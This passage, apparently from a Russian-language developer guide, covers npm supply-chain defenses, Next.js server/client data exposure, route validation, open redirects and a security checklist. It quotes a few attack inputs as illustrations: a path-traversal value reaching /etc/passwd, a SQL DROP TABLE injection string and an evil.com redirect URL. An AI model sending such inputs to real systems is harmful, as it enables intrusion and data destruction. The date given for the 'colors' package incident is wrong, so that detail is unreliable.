В 2021 году пакет `ua-parser-js` (13 миллионов загрузок в неделю) был скомпрометирован — злоумышленник получил доступ к npm-аккаунту мейнтейнера и добавил вредоносный код, который краёл криптовалютные кошельки. В 2024 году пакет `colors` (30 миллионов загрузок в неделю) намеренно возвращал мусорные данные в знак протеста against коммерческого использования.

Это не теоретические угрозы — это реальные инциденты, которые затронули тысячи приложений.

### Аудит зависимостей

Все популярные пакетные менеджеры имеют встроенные инструменты аудита:

```bash
# npm — проверяет все зависимости на известные уязвимости
npm audit

# pnpm
pnpm audit

# yarn
yarn audit
```

Эти инструменты сравнивают ваши зависимости с базой данных известных уязвимостей (CVE) и показывают, какие пакеты нужно обновить.

### Автоматический аудит в CI/CD

Аудит не должен быть ручной операцией. Настройте автоматическую проверку в CI/CD:

```yaml
# .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm audit --audit-level=high
```

Если `npm audit` находит уязвимости с уровнем `high` или `critical`, CI падает, и PR не может быть смержен. Это гарантирует, что уязвимые зависимости не попадут в production.

### Lock-файлы — защита от supply chain атак

`package-lock.json`, `pnpm-lock.yaml` или `yarn.lock` — это не просто «удобные файлы для воспроизводимых сборок». Это **защита от supply chain атак**.

Без lock-файла `npm install` может установить другие версии зависимостей, чем те, которые вы тестировали. Злоумышленник может опубликовать вредоносную версию пакета, и `npm install` без lock-файла может установить именно её.

Lock-файл фиксирует точные версии всех зависимостей (включая транзитивные). Если кто-то попытается подменить версию, CI обнаружит несоответствие и упадёт.

**Всегда коммитьте lock-файлы в репозиторий.**

### Инструменты мониторинга

- **Snyk** — автоматический мониторинг уязвимостей, интеграция с GitHub, автоматические PR с исправлениями
- **Socket** — анализ supply chain рисков (помимо CVE, проверяет поведение пакетов)
- **Dependabot** (встроен в GitHub) — автоматические PR для обновления зависимостей

---

## Безопасность в Next.js — серверные особенности

### Изоляция серверного и клиентского кода

Next.js разделяет код на Server Components и Client Components. Это разделение имеет важные последствия для безопасности: секреты в Server Components не попадают в клиентский бандл, но данные, переданные в Client Components, становятся видны пользователю.

```tsx
// ✅ Секреты только в Server Components
// app/api/users/route.ts
export async function GET() {
  const users = await db.users.findMany();
  return Response.json(users);
}

// ⚠️ Осторожно: данные, переданные клиенту, видны пользователю
// app/page.tsx — Server Component
import { db } from "@/lib/db";

export default async function Page() {
  const users = await db.users.findMany();
  // users содержит все поля, включая email, phone и т.д.
  return <ClientComponent users={users} />;
}

// components/ClientComponent.tsx — Client Component
"use client";
export default function ClientComponent({ users }) {
  // users теперь в клиентском JavaScript — пользователь может увидеть все поля
  return <ul>{users.map((u) => <li key={u.id}>{u.name}</li>)}</ul>;
}
```

Хотя в этом примере рендерится только `name`, объект `users` полностью доступен в клиентском JavaScript. Пользователь может открыть DevTools и увидеть email, phone и другие поля. **Передавайте клиенту только те данные, которые он должен видеть.**

### Валидация параметров маршрутов

Параметры маршрутов приходят из URL — а URL контролирует пользователь. Никогда не доверяйте параметрам маршрутов:

```tsx
// app/users/[id]/page.tsx
import { z } from "zod";

const paramsSchema = z.object({
  id: z.string().uuid(),
});

export default async function UserPage({ params }: { params: { id: string } }) {
  const parsed = paramsSchema.safeParse(params);

  if (!parsed.success) {
    return <div>Invalid user ID</div>;
  }

  const user = await db.users.findById(parsed.data.id);
  return <div>{user.name}</div>;
}
```

Без валидации злоумышленник может передать `id=../../etc/passwd` или `id='; DROP TABLE users;--` и попытаться эксплуатировать уязвимости.

### Защита от Open Redirect

Open Redirect — это уязвимость, при которой приложение перенаправляет пользователя на произвольный URL. Злоумышленники используют это для фишинга:

```
https://mysite.com/login?callbackUrl=https://evil.com
```

После входа пользователь перенаправляется на `evil.com`, которая выглядит как страница входа `mysite.com` и крадёт учётные данные.

```tsx
// ❌ Уязвимость: redirect на любой URL
const callbackUrl = searchParams.get("callbackUrl");
redirect(callbackUrl); // Может перенаправить на evil.com!

// ✅ Защита: разрешаем только внутренние URL
const callbackUrl = searchParams.get("callbackUrl");
const isInternal = callbackUrl?.startsWith("/");

if (isInternal) {
  redirect(callbackUrl);
} else {
  redirect("/"); // Fallback на главную
}
```

---

## Философия защиты — глубокая защита и безопасность по умолчанию

### Принцип глубокой защиты (Defense in Depth)

Не полагайтесь на одну линию защиты. Каждая защита может быть обойдена — важно, чтобы за ней была другая.

```
Слой 1: Middleware — проверка авторизации
    ↓ (если обойдён)
Слой 2: Server Component — проверка прав
    ↓ (если обойдён)
Слой 3: Server Action — валидация данных
    ↓ (если обойдена)
Слой 4: Database — constraints и проверки
    ↓ (если обойдены)
Слой 5: CSP — блокировка вредоносного кода
```

Если злоумышленник обойдёт middleware (отправив запрос напрямую), его остановит Server Action. Если обойдёт Server Action (подделав сессию), его остановит проверка прав в базе данных. Если даже он вставит вредоносный скрипт, его заблокирует CSP.

### Принцип наименьших привилегий

Каждый компонент, API-эндпоинт и Server Action должны иметь минимально необходимые права. Если функция может только читать данные, она не должна иметь права на запись. Если пользователь — обычный пользователь, он не должен иметь права администратора.

```tsx
// ✅ Проверка прав на уровне действия
export async function deleteUser(userId: string) {
  const session = await auth();
  if (session.user.role !== "admin") {
    throw new Error("Forbidden");
  }
  await db.users.delete(userId);
}
```

### Безопасность по умолчанию

Компоненты и функции должны быть безопасными по умолчанию — без необходимости явно включать защиту. Разработчик должен приложить усилия, чтобы сделать что-то опасное, а не чтобы сделать что-то безопасное.

```tsx
// ✅ Компонент безопасен по умолчанию
function ExternalLink({ href, children }) {
  return (
    <a href={href} rel="noopener noreferrer" target="_blank">
      {children}
    </a>
  );
}

// rel="noopener noreferrer" предотвращает tabnabbing-атаку
// (когда открытая вкладка может изменить URL родительской страницы)
```

Разработчик, использующий `ExternalLink`, не должен помнить о `rel="noopener noreferrer"` — компонент уже безопасен.

---

## Чек-лист безопасности

### Перед деплоем

- [ ] Обновлены React, Next.js и все зависимости
- [ ] Проверено `npm audit` / `pnpm audit`
- [ ] Секреты не в клиентском бандле (проверить через `NEXT_PUBLIC_`)
- [ ] Настроены HTTP-заголовки безопасности
- [ ] Настроен CSP (хотя бы в report-only режиме)
- [ ] Server Actions валидируют входные данные
- [ ] Проверка авторизации во всех защищённых маршрутах и действиях
- [ ] CSRF-защита для критических операций
- [ ] Rate limiting для публичных API
- [ ] `.env` файлы в `.gitignore`
- [ ] Cookie с флагами `httpOnly`, `secure`, `sameSite`
- [ ] Lock-файлы закоммичены в репозиторий

### Регулярно

- [ ] Аудит зависимостей (еженедельно/ежемесячно)
- [ ] Ротация секретов (ежеквартально)
- [ ] Проверка CSP-отчётов
- [ ] Penetration testing (для критических приложений)
- [ ] Review зависимостей перед установкой новых пакетов

### Антипаттерны — чего никогда не делать

**1. Хранение секретов в клиентском коде.** Если ключ попадает в бандл — он скомпрометирован. Используйте серверные прокси.

**2. Игнорирование валидации.** Клиентские данные — это хаос. Валидируйте всё на сервере, даже если есть валидация на клиенте.

**3. Хранение токенов в localStorage.** XSS может украсть localStorage. Используйте HttpOnly cookies.

**4. Отсутствие rate limiting.** Без rate limiting ваше API уязвимо для spam и brute-force атак.

**5. Доверие параметрам URL.** URL контролирует пользователь. Валидируйте все параметры маршрутов.

**6. Передача лишних данных клиенту.** Если клиенту не нужно поле `passwordHash` — не передавайте его, даже если рендерите только `name`.
